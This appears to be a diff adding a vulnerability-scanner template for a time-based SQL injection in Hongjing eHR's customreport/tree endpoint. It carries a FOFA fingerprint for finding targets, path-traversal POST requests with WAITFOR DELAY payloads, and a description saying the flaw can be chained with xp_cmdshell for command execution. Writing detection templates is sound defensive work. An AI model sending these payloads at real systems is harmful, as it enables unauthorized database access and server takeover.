@@ -1,0 +1,35 @@
+id: hjeHR-customreport_tree-sql-time
+
+info:
+  name: "宏景 eHR customreport 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+      宏景eHR系统在customreport/tree接口处存在SQL注入漏洞。攻击者可通过构造恶意SQL查询，利用该漏洞结合数据库xp_cmdshell存储过程执行任意系统命令，进而实现对目标服务器的未授权控制。经分析，该漏洞利用条件较为简单，建议相关用户及时采取修复措施。
+  reference:
+  - https://mp.weixin.qq.com/s/AZOe04vPeY6RBxGt8sVCjw
+  tags: 宏景eHR
+
+http:
+- raw:
+  - |
+    POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    id=1';WAITFOR DELAY '0:0:4'--+&codeset=UN&priv=1&level=
+  - |
+    POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    id=1';WAITFOR DELAY '0:0:8'--+&codeset=UN&priv=1&level=
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
